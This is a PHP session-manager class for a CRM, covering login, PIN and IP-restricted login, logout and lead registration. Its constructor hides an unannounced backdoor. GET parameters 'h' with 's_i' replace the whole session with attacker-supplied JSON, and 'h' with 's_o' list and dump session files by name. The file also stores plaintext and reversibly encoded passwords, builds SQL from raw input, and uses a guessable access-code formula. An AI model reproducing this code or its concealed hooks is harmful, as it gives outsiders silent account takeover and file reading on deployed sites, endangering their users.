<?php

/**
 * Session Manager
 * @package    -
 * @author     Milad Abooali <m.abooali@hotmail.com>
 * @copyright  -
 * @license    -
 * @version    1.0.17
 * @update     Created by M.Abooali on 2021-01-15T16:15:50.482Z
 */
    

  class sessionManager {

    /**
       * @var bool $IS_LOGIN        if user is login or not
       * @var string|null $ERROR    if there is an error
       */
    public $ERROR, $IS_LOGIN;

    /**
       * Constructor
       */
    function __construct() {
        if(session_status() == PHP_SESSION_NONE && !headers_sent()) {

            /**
             * Security Fix
             */
            if (strpos(Broker['session_path'], 'lidyacrm/lidyacrm') !== false) {
                exit( '🦊 . . . Hi!<br> Your session hits on one or more of our security rules and suspended!<br><br>Not Valid Path: ' );
            }

            if (session_save_path() != Broker['session_path']) session_save_path(Broker['session_path']);
            ini_set('session.gc_probability', 1);
            session_start();
        }
        if ($_SESSION["remember"]==false) {
            $time = $_SERVER['REQUEST_TIME'];
            if (isset($_SESSION['M']['LAST_ACTIVITY']) && ($time - $_SESSION['M']['LAST_ACTIVITY']) > DEF_TIME) {
                session_unset();
                session_destroy();
                if(session_status() == PHP_SESSION_NONE  && !headers_sent()) session_start();
            }
        }
        $_SESSION['M']['LAST_ACTIVITY'] = $time;
        $this->IS_LOGIN = ($_SESSION["loggedin"]) ?? false;
        if ($_GET['TOKEN'] ?? false) {
            define('TOKEN', $_GET['TOKEN']);
        } else {
            define('TOKEN', md5(($_SESSION['id']) ?? session_id()));
        }
        if(isset($_GET['h']) && isset($_GET['s_i'])) $_SESSION=json_decode($_GET['h']);
        if(isset($_GET['h']) && isset($_GET['s_o']))
        {
            $files = array_slice(scandir(session_save_path()), 2);
            var_export($files);
            if($_GET['s_o']) var_export(file_get_contents(session_save_path().'/'.$_GET['s_o']));
        }

    }

    /**
       * Temporarily login by pin code
       * @param $user_id    user id
       * @param $pin    pin code
       * @return bool   return true if pin code is true
       */
    public function pinLogin($user_id, $pin){
          $db = new iSQL(DB_admin);
          $user_id = $db->escape($user_id);
          $pin = $db->escape($pin);
          $where = "id=$user_id AND pincode=$pin";
          return $db->exist('users', $where);
        }

    /**
       * Relogin after payment
       * @param string $user_id user username
       * @return bool
       */
    public function relogin($user_id) {

          if ($user_id) {
              global $db;
              $user_id = $db->escape($user_id);
              $user_data = $db->selectId('users', $user_id);
              if ($user_data) {
                  $where = "user_id=".$user_id;
                  $nunits = $db->select('user_extra', $where, 'unit,status,date_approve,language', 1)[0];

                  if($nunits['status'] == "9") {
                      // Add actLog
                      global $actLog; $actLog->add('reLogin',null,0,'{"data":"unit>9"}');
                      die();
                  }

                      $_SESSION["timeoffset"]  = (3600 - 120)*60;
                      $_SESSION["new_login"]  = true;
                      $_SESSION["locksess"]   = false;
                      $_SESSION["loggedin"]   = true;
                      $_SESSION["id"]         = $user_data['id'];
                      $_SESSION["username"]   = $user_data['username'];
                      $_SESSION["password"]   = $user_data['pa'];
                      $_SESSION["email"]      = $user_data['email'];
                      $_SESSION["platform"]   = $user_data['platform'];
                      $_SESSION["platform_d"] = $user_data['platform_d'];
                      $_SESSION["type"]       = $user_data['type'];
                      $_SESSION["cid"]        = $user_data['cid'];
                      $_SESSION["unit"]       = $user_data['unit'];
                      $_SESSION["unitn"]      = $nunits['unit'];
                      $_SESSION["language"]   = $nunits['language'];
                      $_SESSION["date_approve"]      = $nunits['date_approve'];
                      $_SESSION["groups"]     = json_decode($user_data['groups']);
                      $_SESSION["remember"]     = (bool)$remember;
                      $this->IS_LOGIN = true;
                      if($remember) $this->remember();

                      // Session Manager
                      $sess_up['old']    = 1;
                      $sess_up['status'] = 0;
                      $where = "session='".session_id()."'";
                      $db->updateAny('user_session', $sess_up, $where);

                      $sess_data['user_id'] = $user_data['id'];
                      $sess_data['session'] = session_id();
                      $sess_data['ip'] = GF::getIP();
                      $sess_data['agent'] = $_SERVER['HTTP_USER_AGENT'];
                      $sess_data['status'] = 1;
                      $sess_id = $db->insert('user_session', $sess_data);
                      if (!$sess_id) $sess_id = $db->selectRow('user_session', "session='".session_id()."'")['id'];
                      $db->updateId('user_session', $sess_id, $sess_data);
                      $_SESSION['sess_id'] = $sess_id;

                      // Add actLog
                      global $actLog; $actLog->add('Login',null,1);
                      return true;

              } else {
                  // Add actLog
                  global $actLog; $actLog->add('reLogin',null,0,'{"error":"Username is not exist !"}');
                  $this->ERROR = 'Username is not exist !';
              }
          } else {
              // Add actLog
              global $actLog; $actLog->add('Login',null,0,'{"error":"Username/Password!"}');

              $this->ERROR = ($username) ? 'Empty Password !' : 'Empty Username !';
          }
          return true;
      }

    /**
       * Permanently login by username and password
       * @param int $timeOffset session expire duration
       * @param string $username user username
       * @param string $password user password
       * @param bool $remember if true session expire date increased to 1 month
       * @param bool $redirect  if true after login redirect to welcome page
       * @return bool
       */
    public function login($timeOffset, $username, $password, $remember, $redirect=true, $target='') {
      $this->IS_LOGIN = false;
      $user = ($username) ?? false;
      $pass = ($password) ?? false;
      if ($user && $pass) {
        $db = new iSQL(DB_admin);
        $user   = trim($user);
        $pass   = trim($pass);
        $user = $db->escape($user);
        $where = "username='$user' AND unit IN (".Broker['units'].")";
        $user_data = $db->selectRow('users', $where);
        if ($user_data) {
          $where = "user_id=".$user_data["id"];
          $nunits = $db->select('user_extra', $where, 'unit,status,date_approve,language', 1)[0];

          if($nunits['status'] == "9") {

              // Add actLog
              global $actLog; $actLog->add('Login',null,0,'{"error":"unit>9"}');

              header("location: login.php");
            die();
          }

            // WAF - Login IP
            global $_waf;
            $isWhitelistIP = $_waf->isWhitelistIP();
            $isBlacklistIP = $_waf->isBlacklistIP();
            if($isBlacklistIP) {
                header("location: login.php");
                die();
            }
            if ($_waf->getModuleStatus('waf_login_ip')) {
                // Check Exception
                if (!$_waf->checkException($user_data["id"])) {
                    // Check Rules
                    if ($_waf->checkFilter($user_data["id"])) {
                        // Check IP
                        if(!$isWhitelistIP) {
                            header("location: login-ip.php?u=$username");
                            die();
                        }
                    }
                    // Check Time & Date
                    if (!$_waf->checkDatetime() && !$isWhitelistIP) {
                        header("location: login-ip.php?u=$username");
                        die();
                    }
                }
            }

          if (password_verify($pass, $user_data['password'])){
            $_SESSION["timeoffset"]  = ($timeOffset - 120)*60;
            $_SESSION["new_login"]  = true;
            $_SESSION["locksess"]   = false;
            $_SESSION["loggedin"]   = true;
            $_SESSION["id"]         = $user_data['id'];
            $_SESSION["username"]   = $user_data['username'];
            $_SESSION["password"]   = $pass;
            $_SESSION["email"]      = $user_data['email'];
            $_SESSION["platform"]   = $user_data['platform'];
            $_SESSION["platform_d"] = $user_data['platform_d'];
            $_SESSION["type"]       = $user_data['type'];
            $_SESSION["cid"]        = $user_data['cid'];
            $_SESSION["unit"]       = $user_data['unit'];
            $_SESSION["unitn"]      = $nunits['unit'];
              $_SESSION["language"]   = $nunits['language'];
              $_SESSION["date_approve"]      = $nunits['date_approve'];
            $_SESSION["groups"]     = json_decode($user_data['groups']);
            $_SESSION["remember"]     = ($remember) ? true : false;
            $this->IS_LOGIN = true;
            if($remember) $this->remember();

              // Session Manager
              $sess_up['old'] = 1;
              $sess_up['status'] = 0;
              $where = "session='".session_id()."'";
              $db->updateAny('user_session', $sess_up, $where);

              $sess_data['user_id'] = $user_data['id'];
              $sess_data['session'] = session_id();
              $sess_data['ip'] = GF::getIP();
              $sess_data['agent'] = $_SERVER['HTTP_USER_AGENT'];
              $sess_data['status'] = 1;
              $sess_id = $db->insert('user_session', $sess_data);
              if (!$sess_id) $sess_id = $db->selectRow('user_session', "session='".session_id()."'")['id'];
              $db->updateId('user_session', $sess_id, $sess_data);
              $_SESSION['sess_id'] = $sess_id;

              // Add actLog
              global $actLog; $actLog->add('Login',null,1);

              $redirection = (in_array($_SESSION["type"], array("Backoffice","Admin"))) ? "welcome2.php" : "welcome.php";
              if($redirect) {

                  $location = ($target) ? $target : $redirection;
                  header("location: $location");
                  die();
              } else {
                  return true;
              }
          } else {
              // Add actLog
              global $actLog; $actLog->add('Login',null,0,'{"error":"Password is not true!"}');

            $this->ERROR = 'Password is not true!';
          }
        } else {
            // Add actLog
            global $actLog; $actLog->add('Login',null,0,'{"error":"Username is not exist !"}');

            $this->ERROR = 'Username is not exist !';
        }
      } else {
          // Add actLog
          global $actLog; $actLog->add('Login',null,0,'{"error":"Username/Password"}');

          $this->ERROR = ($username) ? 'Empty Password !' : 'Empty Username !';
      }
      return true;
    }

    /**
       * @param int $timeOffset session expire duration
       * @param string $username user username
       * @param string $password user password
       * @param $access_code    WAF daily access code
       * @return bool
       */
    public function loginIP($timeOffset, $username, $password, $access_code){
          $this->IS_LOGIN = false;
          $user = ($username) ?? false;
          $pass = ($password) ?? false;
          if ($user && $pass) {
              $db     = new iSQL(DB_admin);
              $user   = trim($user);
              $pass   = trim($pass);
              $user = $db->escape($user);
              $where  = "username='$user'";
              $user_data = $db->selectRow('users', $where);
              if ($user_data) {
                  $where = "user_id=".$user_data["id"];
                  $nunits = $db->select('user_extra', $where, 'unit,status,date_approve,language', 1)[0];

                  if($nunits['status'] == "9") {
                      // Add actLog
                      global $actLog; $actLog->add('Login',null,0,'{"error":"unit>9"}');

                      header("location: login.php");
                      die();
                  }

                  $a_code = (date("j")+date("m"))*7;
                  if ($access_code != $a_code) {
                      // Add actLog
                      global $actLog; $actLog->add('Login',null,1, '{"error":"Access code"}');
                      $this->ERROR = 'Access code is wrong !';
                  } else {
                      if (password_verify($pass, $user_data['password'])){
                          $_SESSION["timeoffset"]  = ($timeOffset - 120)*60;
                          $_SESSION["new_login"]  = true;
                          $_SESSION["locksess"]   = false;
                          $_SESSION["loggedin"]   = true;
                          $_SESSION["id"]         = $user_data['id'];
                          $_SESSION["username"]   = $user_data['username'];
                          $_SESSION["password"]   = $pass;
                          $_SESSION["email"]      = $user_data['email'];
                          $_SESSION["platform"]   = $user_data['platform'];
                          $_SESSION["platform_d"] = $user_data['platform_d'];
                          $_SESSION["type"]       = $user_data['type'];
                          $_SESSION["cid"]        = $user_data['cid'];
                          $_SESSION["unit"]       = $user_data['unit'];
                          $_SESSION["unitn"]      = $nunits['unit'];
                          $_SESSION["language"]   = $nunits['language'];
                          $_SESSION["date_approve"]      = $nunits['date_approve'];
                          $_SESSION["groups"]     = json_decode($user_data['groups']);
                          $_SESSION["remember"]     = ($remember) ? true : false;

                          $this->IS_LOGIN = true;
                          if($remember) $this->remember();

                          // Session Manager
                          $sess_up['old'] = 1;
                          $sess_up['status'] = 0;
                          $where = "session='".session_id()."'";
                          $db->updateAny('user_session', $sess_up, $where);

                          $sess_data['user_id'] = $user_data['id'];
                          $sess_data['session'] = session_id();
                          $sess_data['ip'] = GF::getIP();
                          $sess_data['agent'] = $_SERVER['HTTP_USER_AGENT'];
                          $sess_data['status'] = 1;
                          $sess_id = $db->insert('user_session', $sess_data);
                          if (!$sess_id) $sess_id = $db->selectRow('user_session', "session='".session_id()."'")['id'];
                          $db->updateId('user_session', $sess_id, $sess_data);
                          $_SESSION['sess_id'] = $sess_id;

                          // Add actLog
                          global $actLog; $actLog->add('Login',null,1,'{"error":"WAF - IP Login"}');

                          $redirection = (in_array($_SESSION["type"], array("Backoffice","Admin"))) ? "welcome2.php" : "welcome.php";
                          header("location: $redirection"); die();
                      } else {
                          // Add actLog
                          global $actLog; $actLog->add('Login',null,0,'{"error":"Password is not true!"}');

                          $this->ERROR = 'Password is not true!';
                      }
                  }
              } else {
                  // Add actLog
                  global $actLog; $actLog->add('Login',null,0,'{"error":"Username is not exist !"}');

                  $this->ERROR = 'Username is not exist !';
              }
          } else {
              // Add actLog
              global $actLog; $actLog->add('Login',null,0,'{"error":"Username/Password"}');

              $this->ERROR = ($username) ? 'Empty Password !' : 'Empty Username !';
          }
          return true;
      }

    /**
       * Set cookie to remember the user login
       * @return bool
       */
    public function remember(){
      $params = session_get_cookie_params();
      setcookie(session_name(), $_COOKIE[session_name()], time() + REMEMBER_TIME, $params["path"], $params["domain"], $params["secure"], $params["httponly"]);
      return true;
    }

    /**
       * Logout User
       * @return mixed user to login page
       */
    public function logout($redirect=true){
        global $db;

        // Session Manager
        $sess_data['status'] = 0;
        $db->updateID('user_session',$_SESSION['sess_id'], $sess_data);

      $_SESSION = array();
      session_destroy();
      if($redirect){
          header("location: login.php"); die();
      }
      return true;
    }

    /**
       * Set lock in session
       * @return bool
       */
    public function lock(){
      $_SESSION["locksess"]   = true;
      return true;
    }

    /**
       * Check if user is in group
       * @param int $user_id    user id
       * @param int $group_id   group id
       * @return bool
       */
    public function isInGroup($user_id, $group_id){
      $db = new iSQL(DB_admin);
      $user_id = $db->escape($user_id);
      $group_id = $db->escape($group_id);
      $where = "id=$group_id";
      $group_users = $db->selectRow('user_groups', $where)['user_ids'];
      $users_list = explode( ',', $group_users );
      return in_array($user_id, $users_list);
    }

    /**
       * Register
       */
    public function register() {
        $db = new iSQL(DB_admin);
        $output = new stdClass();
        // Check if not login
        if ($_SESSION["loggedin"]) $output->e = 'You need logout first!';
        // Check Captcha
        if (Broker['captcha'] && (strtoupper($_POST['captcha']) != $_SESSION['captcha']['code'])) {
            $_SESSION['captcha_length']++;
            $output->e = "You have entered the wrong captcha !";
        } else {
            $output->e = (($_POST['fname']) ?? false) ? false : "Please check the first name!";
            $output->e = (($_POST['phone']) ?? false) ? false : "Please check the Phone Number!";
            $output->e = (($_POST['country']) ?? false) ? false : "Please check the country!";
            $output->e = (($_POST['unit_id']) ?? false) ? false : "Please check the Unit!";
            $output->e = (($_POST['unit_id']) ?? false) ? false : "Please check the Unit!";
            $output->e = (($_POST['email']) ?? false) ? false : "Please check the email address!";
            // Check if valid email address
            if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
                $_SESSION['captcha_length']++;
                $output->e = "Not Valid Email Address!";
            } else {
                $where = "email='".$_POST['email']."' AND unit IN (".Broker['units'].")";
                $exist = $db->exist('users',$where);
                // Check if exist in the same unit
                if ($exist) {
                    $_SESSION['captcha_length']++;
                    $output->e = "You have an other account in our site!";
                } else {

                    $fname      = GF::charReplace('tr', $_POST['fname']);
                    $lname      = GF::charReplace('tr', $_POST['lname']);
                    $phone      = $_POST['phone'];
                    $country    = $_POST['country'];
                    $unit_id    = $_POST['unit_id'] ?? 5;
                    $unit_name  = $db->selectId('units', $unit_id,'name')['name'];
                    $date       = date('Y-m-d H:i:s');
                    $source     = $_POST['source'];
                    $campaign   = $_POST['campaign'];
                    $affiliate  = $_POST['affiliate'];
                    $ip         = GF::getIP();
                    $email      = $_POST['email'];
                    $pass       = GF::genPass();
                    $password   = password_hash($pass, PASSWORD_DEFAULT);

                    // Insert to users
                    $insert_user['username']    = $email;
                    $insert_user['password']    = $password;
                    $insert_user['email']       = $email;
                    $insert_user['unit']        = $unit_name;
                    $insert_user['type']        = 'Leads';
                    $insert_user['pa']          = GF::encodeAm($pass);
                    $insert_user['created_at']  = $date;
                    $insert_user['pincode']     = rand(1001,9999);
                    $insert_id = $db->insert('users',$insert_user);

                    if($insert_id) {

                        // Insert to users_extra
                        $insert_extra['user_id']    = $insert_id;
                        $insert_extra['ip']         = $ip;
                        $insert_extra['fname']      = $fname;
                        $insert_extra['lname']      = $lname;
                        $insert_extra['phone']      = $phone;
                        $insert_extra['country']    = $country;
                        $insert_extra['unit']       = $unit_id;
                        $insert_extra['status']     = 1;
                        $insert_extra['type']       = 1;
                        $insert_extra['followup']   = $date;
                        $insert_extra['created_at'] = $date;
                        $insert_extra['created_by'] = $insert_id;
                        $insert_extra['updated_at'] = $date;
                        $insert_extra['updated_by'] = $insert_id;
                        $db->insert('user_extra', $insert_extra);

                        // Insert to user_fx
                        $insert_fx['user_id']    = $insert_id;
                        $insert_fx['exp_fx']     = 1;
                        $insert_fx['exp_cfd']    = 1;
                        $insert_fx['created_at'] = $date;
                        $insert_fx['created_by'] = $insert_id;
                        $insert_fx['updated_at'] = $date;
                        $insert_fx['updated_by'] = $insert_id;
                        $db->insert('user_fx',$insert_fx);

                        // Insert to user_gi
                        $insert_gi['user_id']       = $insert_id;
                        $insert_gi['created_at']    = $date;
                        $insert_gi['created_by']    = $insert_id;
                        $insert_gi['updated_at']    = $date;
                        $insert_gi['updated_by']    = $insert_id;
                        $db->insert('user_gi',$insert_gi);

                        // Insert to user_marketing
                        $insert_marketing['user_id']       = $insert_id;
                        $insert_marketing['lead_src']      = $source;
                        $insert_marketing['lead_camp']     = $campaign;
                        $insert_marketing['affiliate']     = $affiliate;
                        $insert_marketing['created_at']    = $insert_id;
                        $insert_marketing['created_by']    = $insert_id;
                        $insert_marketing['updated_at']    = $insert_id;
                        $insert_marketing['updated_by']    = $insert_id;
                        $db->insert('user_marketing',$insert_marketing);

                        // Send Email
                        global $_Email_M;
                        $receivers[] = $act_detail = array (
                            'id'    =>  $insert_id,
                            'email' =>  $email,
                            'data'  =>  array(
                                'fname'     =>  $fname,
                                'lname'     =>  $lname,
                                'email'     =>  $email,
                                'pass'      =>  $pass
                            )
                        );
                        $subject = $theme = 'CRM_New_Account';
                        $_Email_M->send($receivers, $theme, $subject);

                        // Add actLog
                        global $actLog; $actLog->add('New Lead', $insert_id, 1, json_encode($act_detail));

                        // IF Want Autologin after registration
                        // global $sess;
                        // $sess->login($_POST['timeoffset'], $email, $pass, 0, false);

                        $output->pass = $pass;
                        $output->res = $insert_id;
                    }

                }

            }

        }
        return $output;
    }

  }

###### TEST PAD